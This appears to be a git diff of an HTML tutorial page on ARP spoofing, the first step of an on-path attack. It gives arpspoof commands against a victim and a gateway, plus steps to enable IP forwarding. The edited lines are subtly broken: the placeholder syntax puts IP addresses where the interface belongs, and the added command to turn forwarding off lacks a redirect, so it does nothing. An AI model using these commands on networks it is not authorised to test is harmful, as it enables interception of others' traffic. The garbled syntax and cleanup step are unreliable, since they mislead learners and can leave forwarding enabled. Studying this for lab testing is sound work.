@@ -1,29 +1,29 @@
 <h3>ARP Spoof</h3>
-<h4>Create an ARP Spoofer to test the first step process of On-path Attacks.</h4>
-<p>
-Exploit the ARP Protocol, become the Person in the Middle of an On-path Attack.  
-Redirect the requests and response packet from the Router, through yourself, 
-to the Target Host, and vice averse.
-</p>
+<h4>First step process of On-path Attacks.</h4>
 <img src="/assets/images/arp_spoof_diagram1.png" width="450" height="225">
+<br/>
+<h4>Enable port forwarding</h4>
 <p>
-We can use arpspoof package to give a basic idea of our goals here.
 </p>
-<p>
-</p>
-<h4>First target the Client (victim) machine.</h4>
-<p></p>
-<p><b>arpspoof -i</b> [<i>INTERFACE</i>] <b>-t</b> [<i>INTERFACE_IP</i>] [<i>GATEWAY_IP</i>]</p>
+<h4>First: Target (victim) machine.</h4>
+<p><b>arpspoof -i</b> [<i>TARGET_IP</i>] <b>-t</b> [<i>GATEWAY_IP</i>] [<i>GATEWAY_IP</i>]</p>
 <p><b>arpspoof -i <i>eth0</i> -t <i>192.168.63.174 192.168.63.2</i></b></p> 
 
-<h4>Second: to target the Router (gateway) IP, reverse the IPs.
-<p><b>arpspoof -i</b> [<i>INTERFACE</i>] <b>-t</b> [<i>GATEWAY_IP</i>] [<i>TARGET_IP</i>]</p>
+<h4>Second: Router (GATEWAY) IP.
+<p><b>arpspoof -i</b> [<i>GATEWAY_IP</i>] <b>-t</b> [<i>TARGET_IP</i>]</p>
 arpspoof -i [interface] -t [Gateway IP] [target IP (interface)] 
 <p><b>arpspoof -i <i>eth0</i> -t <i>192.168.1.254 192.168.1.72</i></b></p>
 
 <h4>Enable port forwarding on Linux</h4>
+<p>Check if port forwarding is already enabled: <br/>
+cat /proc/sys/net/ipv4/ip_forward - should return 1, if 0 then enable
+</p>
 <p>As the computer is not a router, this will allow packets to flow through it.</p>
 <h4>:~# echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward  </h4>
+<p>When you are finished testing, turn port forwarding off as it is a security risk
+<br/>
+echo 0 /proc/sys/net/ipv4/ip_forward
+</p>
 
 <img src="/assets/images/arp_spoof_diagram2.png" width="450" height="225">
 
